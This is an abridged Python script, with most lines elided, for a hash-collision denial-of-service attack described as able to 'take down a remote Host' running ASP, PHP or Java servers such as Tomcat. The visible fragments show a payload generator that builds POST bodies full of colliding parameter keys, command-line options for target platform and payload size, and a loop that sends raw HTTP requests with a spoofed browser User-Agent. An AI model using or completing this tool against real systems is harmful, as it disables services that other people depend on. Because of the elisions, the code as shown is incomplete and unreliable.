...
-) Take down a JAVA server(tested with Tomcat and Glassfish;
...
class Payloadgenerator:
    ...
    def _generatePayload(self, collisionchars, payloadlength):
        ...
        for i in range(maxvalueint):
            ...
            post += "%s&" % urllib.urlencode({result: ""})
...
def main():
    parser = argparse.ArgumentParser(description="Take down a remote Host via Hashcollisions",
    ...
    parser.add_argument("-t", "--target", dest="target",
                        help="Target of the attack", choices=["ASP", "PHP", "JAVA"], required=True)
    parser.add_argument("-m", "--max-payload-size", dest="maxpayloadsize",
                        help="Maximum size of the Payload in Megabyte. "
                        "PHPs defaultconfiguration does not allow more than 8MB, Tomcat is 2MB",
                        type=int)
    parser.add_argument("-g", "--generate", dest="generate",
                        help="Only generate Payload and exit", default=False, action="store_true")
    ...
    for i in range(options.count):
        ...
        request = "POST %s HTTP/1.1\r\n\
            ...
            Connection: Close\r\n\
            User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.20)\
        ...
        if options.wait or options.output:
            ...
            if options.verbose:
                ...
                print("")
            if options.output:
                f = open("%s%s.html" % (options.output, str(i)), "w")
                f.write("<!-- %s -->\r\n%s" % (header, content))
                f.close()
